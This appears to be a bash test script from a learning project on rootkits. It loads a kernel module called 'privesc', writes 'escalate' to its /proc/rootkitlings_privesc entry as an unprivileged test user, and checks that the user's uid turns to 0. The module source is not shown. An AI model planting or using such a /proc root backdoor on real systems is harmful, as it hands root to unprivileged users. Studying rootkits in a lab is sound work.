#!/bin/bash
set -e

MODULE="privesc"
KO="src/${MODULE}.ko"
PROC="/proc/rootkitlings_privesc"

if [ ! -f "$KO" ]; then
    echo "FAIL: $KO not found. Run make first."
    exit 1
fi

echo "==> Loading $MODULE"
insmod "$KO"

echo "==> Verifying /proc entry exists"
if [ ! -f "$PROC" ]; then
    echo "FAIL: $PROC not found"
    rmmod "$MODULE"
    exit 1
fi

echo "==> Creating unprivileged user for test"
useradd -M testuser 2>/dev/null || true

echo "==> Testing escalation from unprivileged user"
# Run a subshell as testuser that writes to /proc and then checks id
RESULT=$(su testuser -s /bin/bash -c "
    echo 'escalate' > $PROC
    id -u
" 2>&1)

echo "    Result uid: $RESULT"

if echo "$RESULT" | grep -q "^0$"; then
    echo "PASS: process escalated to root (uid=0)"
else
    echo "FAIL: escalation did not work (uid=$RESULT)"
    echo "    Note: the write to /proc escalates the writing process."
    echo "    The 'id' command might be a new process. Try wrapping in exec."
fi

echo "==> dmesg tail:"
dmesg | tail -5

echo "==> Unloading"
rmmod "$MODULE"

echo "==> Cleanup"
userdel testuser 2>/dev/null || true
